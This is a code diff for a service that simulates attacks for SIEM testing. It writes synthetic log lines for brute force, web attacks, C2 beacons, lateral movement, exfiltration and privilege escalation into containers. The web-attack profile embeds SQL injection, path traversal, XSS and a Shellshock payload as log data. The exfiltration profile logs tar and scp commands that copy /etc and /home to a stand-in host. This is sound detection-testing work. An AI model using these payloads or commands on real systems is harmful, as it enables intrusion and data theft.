@@ -5,8 +5,10 @@ import asyncio
 import json
 import logging
 import random
+import re
 import socket
 import time
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 
 from fastapi.encoders import jsonable_encoder
@@ -20,6 +22,8 @@ from app.services.logs import escape_bash_single_quotes, escape_json_string
 from app.state import simulations_db
 
 logger = logging.getLogger(__name__)
+
+SIMULATION_WORKERS = 16  # containers written to at once per second
 
 
 def _build_custom_log_script(config: CustomLogSimulationRequest, simulation_id: str) -> str:
@@ -71,21 +75,9 @@ echo "Generated $COUNT custom events"
     return script
 
 
-def list_simulation_profiles() -> list[str]:
-    """List available simulation profiles"""
-    return [
-        "auth_bruteforce",
-        "web_attacks",
-        "malware_beacon",
-        "lateral_movement",
-        "data_exfiltration",
-        "privilege_escalation"
-    ]
-
-
 def select_agents_for_simulation(selector: AgentSelector, user: dict | None = None) -> list[str]:
     """The running containers matching every criterion given (agent_ids, siem_type,
-    agent_group, tags, status), then a random `count` of them if set."""
+    agent_group, status), then a random `count` of them if set."""
     wanted_ids = set(selector.agent_ids or [])
     siem_type = getattr(selector.siem_type, "value", selector.siem_type)
     status = getattr(selector.status, "value", selector.status)
@@ -98,13 +90,11 @@ def select_agents_for_simulation(selector: AgentSelector, user: dict | None = No
             continue  # only running containers can generate events
         if status and status != "running":
             continue
-        if siem_type or selector.agent_group or selector.tags:
+        if siem_type or selector.agent_group:
             meta = read_agent_metadata(name)
             if siem_type and meta.get("siem_type") != siem_type:
                 continue
             if selector.agent_group and meta.get("agent_group") != selector.agent_group:
-                continue
-            if selector.tags and not set(selector.tags) & set(meta.get("tags") or []):
                 continue
         selected.append(name)
 
@@ -138,42 +128,55 @@ def announce_finished(simulation_id: str) -> None:
 
 async def run_simulation(simulation_id: str, profile_id: str, agents: list[str],
                         duration: int, eps_target: int):
-    """Run simulation on selected containers"""
+    """Run an attack profile on the selected containers: every second, each container writes
+    `eps_target` log lines (in parallel across containers), for `duration` seconds."""
     try:
         logger.info(f"Starting simulation {simulation_id} on {len(agents)} containers")
-
-        start_time = time.time()
-        end_time = start_time + duration
-        events_generated = 0
-
-        while time.time() < end_time:
-            if simulations_db.get(simulation_id, {}).get("status") != "running":
-                break  # stopped by a user, or interrupted by a restart
-            # Generate events on containers
-            for agent in agents:
-                try:
-                    result = generate_simulation_events(agent, profile_id, eps_target)
-                    events_generated += result.get("events", 0)
-                except Exception as e:
-                    logger.error(f"Error generating events on {agent}: {e}")
-
-            await asyncio.sleep(1)
-
-            # Update simulation status
-            if simulation_id in simulations_db:
-                simulations_db[simulation_id]["events_generated"] = events_generated
-
-        # Mark as completed (unless it was stopped or interrupted)
+        attacker_ip = f"203.0.113.{random.randint(10, 250)}"  # one attacker per run, from a documentation range
         if simulation_id in simulations_db:
-            if simulations_db[simulation_id].get("status") == "running":
-                simulations_db[simulation_id]["status"] = "completed"
-            simulations_db[simulation_id]["completed_at"] = utc_now().isoformat()
-            simulations_db[simulation_id]["events_generated"] = events_generated
+            simulations_db[simulation_id]["attacker_ip"] = attacker_ip
+
+        end_time = time.time() + duration
+        events_generated = 0
+        failures = 0
+        last_error = None
+
+        def tick(agent: str) -> dict:
+            return generate_simulation_events(agent, profile_id, eps_target, attacker_ip)
+
+        with ThreadPoolExecutor(max_workers=min(SIMULATION_WORKERS, max(1, len(agents)))) as pool:
+            while time.time() < end_time:
+                if simulations_db.get(simulation_id, {}).get("status") != "running":
+                    break  # stopped by a user, or interrupted by a restart
+                started = time.monotonic()
+                results = await asyncio.to_thread(lambda: list(pool.map(tick, agents)))
+                for result in results:
+                    events_generated += result.get("events", 0)
+                    if not result.get("success"):
+                        failures += 1
+                        last_error = result.get("error") or last_error
+                if simulation_id in simulations_db:
+                    simulations_db[simulation_id]["events_generated"] = events_generated
+                    simulations_db[simulation_id]["failed_writes"] = failures
+                    if last_error:
+                        simulations_db[simulation_id]["last_error"] = last_error
+                await asyncio.sleep(max(0.0, 1.0 - (time.monotonic() - started)))
+
+        if simulation_id in simulations_db:
+            sim = simulations_db[simulation_id]
+            if sim.get("status") == "running":
+                # Nothing written at all means the profile couldn't run on these containers
+                sim["status"] = "completed" if events_generated else "failed"
+                if not events_generated:
+                    sim["error"] = last_error or "No events were written"
+            sim["completed_at"] = utc_now().isoformat()
+            sim["events_generated"] = events_generated
 
         log_activity("simulation_completed", {
             "simulation_id": simulation_id,
-            "events_generated": events_generated
-        })
+            "events_generated": events_generated,
+            "failed_writes": failures,
+        }, status="success" if events_generated and not failures else ("partial" if events_generated else "error"))
 
         logger.info(f"Simulation {simulation_id} completed with {events_generated} events")
 
@@ -378,39 +381,132 @@ def run_syslog_simulation(simulation_id: str, request: SyslogSimulationRequest) 
     announce_finished(simulation_id)
 
 
-def generate_simulation_events(agent_name: str, profile_id: str, eps_target: int) -> dict:
-    """Generate simulation events on a container"""
-    try:
-        script = get_simulation_script(profile_id, eps_target)
-        result = execute_in_container(agent_name, script, timeout=10)
-
-        return {
-            "success": result["success"],
-            "events": eps_target  # Simplified
-        }
-    except Exception as e:
-        logger.error(f"Failed to generate events on {agent_name}: {e}")
-        return {"success": False, "events": 0}
+def generate_simulation_events(agent_name: str, profile_id: str, eps_target: int,
+                               attacker_ip: str = "203.0.113.50") -> dict:
+    """Write one second's worth (`eps_target` lines) of a profile's events in a container.
+    Returns the number of lines actually written."""
+    script = build_attack_script(profile_id, eps_target, attacker_ip)
+    result = execute_in_container(agent_name, script, timeout=10)
+    match = re.search(r"EVENTS_WRITTEN=(\d+)", result.get("stdout") or "")
+    events = int(match.group(1)) if match and result.get("success") else 0
+    error = None if events else ((result.get("stderr") or result.get("stdout") or "no output").strip()[-300:])
+    return {"success": bool(events), "events": events, "error": error}
 
 
-def get_simulation_script(profile_id: str, eps_target: int) -> str:
-    """Get simulation script for a profile"""
-    scripts = {
-        "auth_bruteforce": f"""
-            for i in {{1..{eps_target}}}; do
-                echo "$(date) sshd[$$]: Failed password for invalid user admin from 192.168.1.100 port 22 ssh2" >> /var/log/auth.log
-            done
-        """,
-        "web_attacks": f"""
-            for i in {{1..{eps_target}}}; do
-                echo '$(date) 192.168.1.100 - - [$(date)] "GET /admin/../../../etc/passwd HTTP/1.1" 404 -' >> /var/log/apache2/access.log
-            done
-        """,
-        "malware_beacon": f"""
-            for i in {{1..{eps_target}}}; do
-                echo "$(date) MALWARE: Beacon to C2 server 185.220.100.240:443" >> /var/log/syslog
-            done
-        """
-    }
+# ── attack profiles ─────────────────────────────────────────────────────
+#
+# Each profile writes log lines in the formats the SIEM agents parse out of the box:
+# syslog lines ("Sep 24 20:15:01 host sshd[123]: ...") in /var/log/auth.log and
+# /var/log/syslog, and Apache's combined format in /var/log/apache2/access.log.
+# External addresses come from the documentation ranges (RFC 5737), so no real host is
+# implicated. Lines vary (users, ports, PIDs, requests) so they look like real traffic.
 
-    return scripts.get(profile_id, "echo 'Unknown profile'")
+PROFILES = {
+    "auth_bruteforce": "SSH password guessing from one external address against many user names",
+    "web_attacks": "SQL injection, path traversal, XSS, Shellshock and scanner requests to a web server",
+    "malware_beacon": "Repeated outbound connections to a command-and-control address, blocked by the firewall",
+    "lateral_movement": "One service account signing in over SSH from many internal hosts",
+    "data_exfiltration": "Archiving sensitive directories with sudo and copying them to an external host",
+    "privilege_escalation": "A web server account trying sudo and su to become root",
+}
+
+_PREAMBLE = r"""set -e
+H=$(hostname)
+IP=$(hostname -I 2>/dev/null | awk '{print $1}')
+IP=${IP:-10.0.3.10}
+A='%(attacker)s'
+N=%(count)d
+TS=$(date '+%%b %%e %%H:%%M:%%S')
+AUTH='%(root)s/var/log/auth.log'
+SYSLOG='%(root)s/var/log/syslog'
+WEB='%(root)s/var/log/apache2/access.log'
+mkdir -p "$(dirname "$AUTH")" "$(dirname "$WEB")"
+"""
+
+_BODIES = {
+    "auth_bruteforce": r"""USERS=(admin root test oracle ubuntu postgres git deploy)
+{ for i in $(seq 1 "$N"); do
+  printf '%s %s sshd[%d]: Failed password for invalid user %s from %s port %d ssh2
+'     "$TS" "$H" $((RANDOM % 60000 + 1000)) "${USERS[$((RANDOM % 8))]}" "$A" $((RANDOM % 30000 + 30000))
+done; } >> "$AUTH"
+""",
+    "web_attacks": r"""WT=$(date '+%d/%b/%Y:%H:%M:%S %z')
+REQS=("GET /index.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1"
+      "GET /../../../../etc/passwd HTTP/1.1"
+      "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1"
+      "GET /cgi-bin/status HTTP/1.1"
+      "GET /wp-login.php HTTP/1.1"
+      "POST /login.php?user=admin%27-- HTTP/1.1")
+CODES=(200 400 200 500 404 302)
+AGENTS=("sqlmap/1.8" "Mozilla/5.0" "Mozilla/5.0" "() { :; }; /bin/bash -c id" "Mozilla/5.00 (Nikto/2.5.0)" "sqlmap/1.8")
+{ for i in $(seq 1 "$N"); do
+  k=$((RANDOM % 6))
+  printf '%s - - [%s] "%s" %s %d "-" "%s"
+' "$A" "$WT" "${REQS[$k]}" "${CODES[$k]}" $((RANDOM % 4000 + 200)) "${AGENTS[$k]}"
+done; } >> "$WEB"
+""",
+    "malware_beacon": r"""C2=198.51.100.66
+{ for i in $(seq 1 "$N"); do
+  printf '%s %s kernel: [%d.%06d] [UFW BLOCK] IN= OUT=eth0 SRC=%s DST=%s LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=%d DF PROTO=TCP SPT=%d DPT=443 WINDOW=64240 RES=0x00 SYN URGP=0
+'     "$TS" "$H" $((RANDOM % 90000 + 1000)) $((RANDOM * 30)) "$IP" "$C2" $((RANDOM % 65000)) $((RANDOM % 30000 + 30000))
+done; } >> "$SYSLOG"
+""",
+    "lateral_movement": r"""{ for i in $(seq 1 "$N"); do
+  SRC="10.$((RANDOM % 4 + 10)).$((RANDOM % 250 + 1)).$((RANDOM % 250 + 2))"
+  PID=$((RANDOM % 60000 + 1000))
+  if [ $((i % 2)) -eq 1 ]; then
+    printf '%s %s sshd[%d]: Accepted password for svc_backup from %s port %d ssh2
+' "$TS" "$H" "$PID" "$SRC" $((RANDOM % 30000 + 30000))
+  else
+    printf '%s %s sshd[%d]: pam_unix(sshd:session): session opened for user svc_backup(uid=1002) by (uid=0)
+' "$TS" "$H" "$PID"
+  fi
+done; } >> "$AUTH"
+""",
+    "data_exfiltration": r"""DEST=198.51.100.23
+HALF=$(( (N + 1) / 2 ))
+{ for i in $(seq 1 "$HALF"); do
+  if [ $((i % 2)) -eq 1 ]; then
+    printf '%s %s sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/.cache-%d.tgz /etc /home /var/backups
+' "$TS" "$H" "$i"
+  else
+    printf '%s %s sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/scp /tmp/.cache-%d.tgz ops@%s:/upload/
+' "$TS" "$H" "$((i - 1))" "$DEST"
+  fi
+done; } >> "$AUTH"
+{ for i in $(seq 1 $((N - HALF))); do
+  printf '%s %s kernel: [%d.%06d] [UFW ALLOW] IN= OUT=eth0 SRC=%s DST=%s LEN=1500 TOS=0x00 PREC=0x00 TTL=64 ID=%d DF PROTO=TCP SPT=%d DPT=22 WINDOW=501 RES=0x00 ACK PSH URGP=0
+'     "$TS" "$H" $((RANDOM % 90000 + 1000)) $((RANDOM * 30)) "$IP" "$DEST" $((RANDOM % 65000)) $((RANDOM % 30000 + 30000))
+done; } >> "$SYSLOG"
+""",
+    "privilege_escalation": r"""{ for i in $(seq 1 "$N"); do
+  case $((i % 3)) in
+    1) printf '%s %s sudo: pam_unix(sudo:auth): authentication failure; logname=www-data uid=33 euid=0 tty=/dev/pts/1 ruser=www-data rhost=  user=www-data
+' "$TS" "$H" ;;
+    2) printf '%s %s sudo: www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+' "$TS" "$H" ;;
+    0) printf '%s %s su[%d]: FAILED SU (to root) www-data on pts/1
+' "$TS" "$H" $((RANDOM % 60000 + 1000)) ;;
+  esac
+done; } >> "$AUTH"
+""",
+}
+
+
+def list_simulation_profiles() -> list[str]:
+    """The attack profiles that can be run."""
+    return list(PROFILES)
+
+
+def build_attack_script(profile_id: str, count: int, attacker_ip: str, log_root: str = "") -> str:
+    """The bash script that appends `count` lines of a profile's events and prints
+    EVENTS_WRITTEN=<count>. `log_root` prefixes the log paths (tests)."""
+    if profile_id not in _BODIES:
+        raise ValueError(f"Unknown attack profile: {profile_id}")
+    if not re.fullmatch(r"[0-9.]+", attacker_ip):
+        raise ValueError("attacker_ip must be an IPv4 address")
+    if log_root and not re.fullmatch(r"[\w./-]+", log_root):
+        raise ValueError("log_root must be a plain path")
+    count = max(1, int(count))
+    return (_PREAMBLE % {"attacker": attacker_ip, "count": count, "root": log_root}
+            + _BODIES[profile_id] + 'echo "EVENTS_WRITTEN=$N"\n')
